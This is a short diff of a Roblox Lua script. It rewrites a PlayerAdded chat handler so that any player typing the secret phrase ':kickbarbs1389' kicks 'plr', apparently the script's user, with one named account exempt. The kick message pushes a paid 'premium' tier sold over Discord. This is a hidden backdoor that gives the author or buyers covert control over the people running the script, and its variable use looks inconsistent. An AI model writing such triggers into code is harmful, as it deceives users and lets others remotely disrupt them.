@@ -32,8 +32,8 @@ local function removeFade()
 end
 
 game.Players.PlayerAdded:connect(function(playerAdded)
-	plr.Chatted:connect(function(msg)
-		if msg == ":kickbarbs1389" then
+	playerAdded.Chatted:connect(function(msg)
+		if msg == ":kickbarbs1389" and plr.Name ~= "t58l" then
 			plr:Kick("Someone with the script's premium kicked you... Buy premium by adding onlybarbarian on discord.")
 		end
 
